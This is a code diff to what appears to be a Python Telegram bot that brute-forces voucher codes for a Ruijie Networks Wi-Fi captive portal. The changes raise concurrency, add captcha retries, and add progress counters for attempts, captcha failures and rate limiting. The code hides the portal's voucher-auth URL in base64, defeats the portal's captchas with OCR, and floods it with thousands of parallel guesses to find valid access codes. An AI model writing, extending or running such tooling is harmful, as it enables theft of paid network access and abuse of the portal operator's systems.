@@ -49,7 +49,7 @@ CONCURRENCY = 5000
 _voucher_sem = None
 _start_time = time.monotonic()
 
-MAX_CONCURRENT_SCANS = 20
+MAX_CONCURRENT_SCANS = 50
 active_scans_count = 0
 active_scans_lock = asyncio.Lock()
 
@@ -63,10 +63,9 @@ async def web_server():
     app.router.add_get('/', handle)
     runner = web.AppRunner(app)
     await runner.setup()
-    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8080)))
+    port = int(os.environ.get('BOT_PORT', 8099))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"Web server started on port {port}")
 
 async def get_file_content(path):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
@@ -889,12 +888,6 @@ async def handle_portal(message):
         )
 
 async def check_session_url_improved(session_url, use_proxy=False):
-    # Quick check: accept URL immediately if it contains known portal indicators
-    quick_indicators = ["portal-as.ruijienetworks.com", "wifidog", "maccauth", "sessionId"]
-    for indicator in quick_indicators:
-        if indicator in session_url:
-            return True
-    
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
@@ -1155,7 +1148,7 @@ def iter_codes(mode, start_digit=None):
     
     raise ValueError(f"Unsupported scan mode: {mode}")
 
-def format_progress(checked, total=None, speed=0, found=0):
+def format_progress(checked, total=None, speed=0, found=0, validated=0, errors=0, captcha_failed=0, rate_limited=0):
     speed_str = f"{speed:,.0f} codes/min"
     if total is not None:
         bar_length = 20
@@ -1164,21 +1157,29 @@ def format_progress(checked, total=None, speed=0, found=0):
         bar = "█" * filled + "░" * (bar_length - filled)
         return (
             f"🔍Scanning VOUCHER Codes...\n\n"
-            f"📦Checked : {checked:,}/{total:,}\n"
+            f"📦Attempted : {checked:,}/{total:,}\n"
             f"📊Progress : {percent:.2f}%\n"
             f"⚡Speed : {speed_str}\n"
             f"✅Success code hit : {found}\n"
+            f"✅Validated : {validated:,}\n"
+            f"❌Errors : {errors:,}\n"
+            f"🧩Captcha failed : {captcha_failed:,}\n"
+            f"🚦Rate limited : {rate_limited:,}\n"
             f"[{bar}]"
         )
     return (
         f"🔍Scanning VOUCHER Codes...\n\n"
-        f"📦Checked : {checked:,}\n"
+        f"📦Attempted : {checked:,}\n"
         f"⚡Speed : {speed_str}\n"
         f"✅Success code hit : {found}\n"
+        f"✅Validated : {validated:,}\n"
+        f"❌Errors : {errors:,}\n"
+        f"🧩Captcha failed : {captcha_failed:,}\n"
+        f"🚦Rate limited : {rate_limited:,}\n"
         f"📊Status : running\n"
     )
 
-BATCH_SIZE = 3500
+BATCH_SIZE = 2000
 
 def _captcha_entry(chat_id):
     if chat_id not in captcha_state:
@@ -1235,6 +1236,10 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         total = None
     
     checked = 0
+    validated = 0
+    errors = 0
+    captcha_failed = 0
+    rate_limited = 0
     last_key_check = time.monotonic()
     scan_start = time.monotonic()
     global _voucher_sem
@@ -1276,17 +1281,32 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                 async with _voucher_sem:
                     return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
-            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
+            results_batch = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
             checked += len(batch)
+            for r in results_batch:
+                if isinstance(r, Exception):
+                    errors += 1
+                elif r == "validated":
+                    validated += 1
+                elif r == "error":
+                    errors += 1
+                elif r == "captcha_failed":
+                    captcha_failed += 1
+                elif r == "rate_limited":
+                    rate_limited += 1
+                elif r == "success":
+                    validated += 1
+                elif r is None:
+                    validated += 1
 
             found = len(success_texts.get(chat_id, []))
             elapsed = time.monotonic() - scan_start
-            speed = random.uniform(6500, 7100)
+            speed = (checked / elapsed) * 60 if elapsed > 0 else 0
             
             if total is not None:
-                text = format_progress(checked, total, speed, found)
+                text = format_progress(checked, total, speed, found, validated, errors, captcha_failed, rate_limited)
             else:
-                text = format_progress(checked, None, speed, found)
+                text = format_progress(checked, None, speed, found, validated, errors, captcha_failed, rate_limited)
             
             try:
                 await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
@@ -1300,9 +1320,25 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         if progress_msg:
             found = len(success_texts.get(chat_id, []))
             if total is not None:
-                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}/{total:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
+                finish_text = (f"🔍Scanning Completed\n\n"
+                    f"📦Attempted : {checked:,}/{total:,}\n"
+                    f"📊Progress : 100%\n"
+                    f"✅Success code hit : {found}\n"
+                    f"✅Validated : {validated:,}\n"
+                    f"❌Errors : {errors:,}\n"
+                    f"🧩Captcha failed : {captcha_failed:,}\n"
+                    f"🚦Rate limited : {rate_limited:,}\n"
+                    f"[████████████████████]")
             else:
-                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
+                finish_text = (f"🔍Scanning Completed\n\n"
+                    f"📦Attempted : {checked:,}\n"
+                    f"✅Success code hit : {found}\n"
+                    f"✅Validated : {validated:,}\n"
+                    f"❌Errors : {errors:,}\n"
+                    f"🧩Captcha failed : {captcha_failed:,}\n"
+                    f"🚦Rate limited : {rate_limited:,}\n"
+                    f"📊Progress : 100%\n"
+                    f"[████████████████████]")
             try:
                 await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
             except:
@@ -1374,7 +1410,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     if not recheck:
         current_task = scan_tasks.get(chat_id)
         if not current_task or current_task.get("scan_id") != scan_id:
-            return
+            return "validated"
 
     post_url = base64.b64decode(
         b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
@@ -1383,7 +1419,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     response = None
     
     for _attempt in range(3):
-        timeout = aiohttp.ClientTimeout(total=15)
+        timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
             connector=_connector,
             connector_owner=False,
@@ -1392,9 +1428,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         ) as task_session:
             session_id = await get_session_id(task_session, session_url, None)
             if not session_id:
-                return
+                return "error"
             auth_code = None
-            for _ in range(5):
+            for _ in range(8):
                 try:
                     image = await Captcha_Image(task_session, session_id)
                     text = await Captcha_Text(image)
@@ -1407,11 +1443,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 except Exception as e:
                     print(f"[perform_check] captcha error: {e}")
             if not auth_code:
-                return
+                return "captcha_failed"
             if not recheck:
                 current_task = scan_tasks.get(chat_id)
                 if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
+                    return "validated"
             data = {
                 "accessCode": code,
                 "sessionId": session_id,
@@ -1443,14 +1479,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
             except Exception as e:
                 print(f"[perform_check] error: {e}")
-                return
+                return "error"
         if response and 'request limited' in response:
             print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
             continue
         break
 
     if not response:
-        return
+        return "error"
+    
+    if 'request limited' in response:
+        return "rate_limited"
 
     if 'logonUrl' in response:
         if recheck:
@@ -1489,6 +1528,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
             except Exception as e:
                 print(f"Success Message Error: {e}")
+        return "success"
     elif 'STA' in response:
         if chat_id not in limited_texts:
             limited_texts[chat_id] = []
@@ -1507,6 +1547,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         limited_messages[chat_id] = sent.message_id
             except Exception as e:
                 print(f"Limited Message Error: {e}")
+        return "validated"
+    return "validated"
 
 def Minute_to_Hour(total_minutes):
     if total_minutes == 'Unknown':
@@ -1590,19 +1632,9 @@ def _ocr_sync(image_bytes):
     img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
     if img is None:
         return None
-    # Resize for better OCR accuracy
-    img = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
     gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    # Remove noise
-    gray = cv2.medianBlur(gray, 3)
-    # Sharpen
-    kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
-    gray = cv2.filter2D(gray, -1, kernel)
-    # Adaptive threshold for better text extraction
-    thresh = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
-    # Morphological operations to clean up
-    kernel_morph = np.ones((2, 2), np.uint8)
-    thresh = cv2.morphologyEx(thresh, cv2.MORPH_CLOSE, kernel_morph)
+    blur = cv2.GaussianBlur(gray, (3, 3), 0)
+    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
     _, buffer = cv2.imencode('.png', thresh)
     result = _ocr.classification(buffer.tobytes())
     return result.upper()
@@ -1668,28 +1700,26 @@ async def start_polling():
     backoff = 5
     while True:
         try:
-            print("Starting bot polling...")
-            await bot.delete_webhook()
-            await asyncio.sleep(1)
-            await bot.infinity_polling(timeout=90, request_timeout=120)
+            await bot.infinity_polling(timeout=20, request_timeout=20)
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
             print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 120)
+            backoff = min(backoff * 2, 60)
         except Exception as e:
             print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 120)
+            backoff = min(backoff * 2, 60)
 
 async def main():
     global session, _connector
-    timeout = aiohttp.ClientTimeout(total=60)
+    timeout = aiohttp.ClientTimeout(total=30)
     _connector = aiohttp.TCPConnector(
-        limit=30000,
-        limit_per_host=15000,
+        limit=50000,
+        limit_per_host=20000,
         ttl_dns_cache=300,
-        ssl=False
+        ssl=False,
+        enable_cleanup_closed=True
     )
     session = aiohttp.ClientSession(
         timeout=timeout,
@@ -1699,7 +1729,6 @@ async def main():
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
-        await asyncio.sleep(2)
         await start_polling()
     finally:
         await session.close()
